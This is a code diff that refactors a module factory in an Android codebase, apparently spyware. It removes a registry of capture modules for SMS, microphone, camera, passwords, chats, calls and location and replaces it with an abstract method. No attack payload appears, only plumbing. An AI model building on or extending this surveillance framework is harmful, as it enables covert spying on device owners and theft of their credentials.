@@ -17,32 +17,13 @@ import com.android.dvci.interfaces.AbstractFactory;
 import com.android.dvci.util.Check;
 import com.android.mm.M;
 
-public class FactoryModule implements AbstractFactory<BaseModule, String> {
+public abstract class FactoryModule implements AbstractFactory<BaseModule, String> {
 	private static final String TAG = "FactoryAgent"; //$NON-NLS-1$
 	Hashtable<String, Class> factorymap = new Hashtable<String, Class>();
 	Hashtable<Class, String> typemap = new Hashtable<Class, String>();
 
 	public FactoryModule() {
-		factorymap.put(M.e("sms"), ModuleMessage.class);
-		factorymap.put(M.e("addressbook"), ModuleAddressBook.class);
-		factorymap.put(M.e("calendar"), ModuleCalendar.class);
-		factorymap.put(M.e("device"), ModuleDevice.class);
-		factorymap.put(M.e("position"), ModulePosition.class);
-		factorymap.put(M.e("screenshot"), ModuleSnapshot.class);
-		factorymap.put(M.e("messages"), ModuleMessage.class);
-
-		factorymap.put(M.e("mic"), ModuleMicL.class);
-
-		factorymap.put(M.e("camera"), ModuleCamera.class);
-		factorymap.put(M.e("clipboard"), ModuleClipboard.class);
-		factorymap.put(M.e("crisis"), ModuleCrisis.class);
-		factorymap.put(M.e("application"), ModuleApplication.class);
-		factorymap.put(M.e("call"), ModuleCall.class);
-		factorymap.put(M.e("chat"), ModuleChat.class);
-		factorymap.put(M.e("password"), ModulePassword.class);
-
-		factorymap.put(M.e("photo"), ModulePhoto.class);
-		factorymap.put(M.e("url"), ModuleUrl.class);
+		factorymap = setFactoryMap();
 
 		Enumeration<String> en = factorymap.keys();
 		while (en.hasMoreElements()) {
@@ -52,6 +33,8 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 		}
 
 	}
+
+	abstract Hashtable<String, Class> setFactoryMap();
 
 	public String getType(Class cl) {
 		if(typemap.containsKey(cl)){
@@ -93,3 +76,4 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 
 	}
 }
+
